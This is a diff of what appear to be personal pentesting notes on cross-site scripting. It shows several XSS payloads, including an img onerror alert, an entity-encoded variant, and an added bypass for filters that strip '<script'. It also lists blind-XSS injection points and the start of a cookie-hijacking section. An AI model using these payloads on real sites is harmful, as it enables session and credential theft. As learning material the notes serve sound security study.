@@ -1,5 +1,4 @@
 #xss
-#cheatseet
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 automation:
@@ -13,8 +12,7 @@ give it a try for stored xss:
 typical payload:
 blind: ip, cookie, url
 
-**DOM XSS payload**:
-[[DOM-based XSS]]
+[[DOM-based XSS]] payload:
 ```html
 <img src="" onerror=alert(window.origin)>
 ```
@@ -37,20 +35,21 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 ?>
 ```
 
-
 ```html
 <img src=x onerror="&#x61;lert(1)">
 ```
-
+#### Bypass auto replace
+If `<script` is removed:
+```html
+<<script>test</script>script>alert(1);</script>
+```
 #### Blind XSS
-
 Common places:
 - Contact Forms
 - Reviews
 - User Details
 - Support Tickets
 - HTTP User-Agent header
-
 #### Example of hijacking cookies:
 [[Session hijacking]]
 Run server:
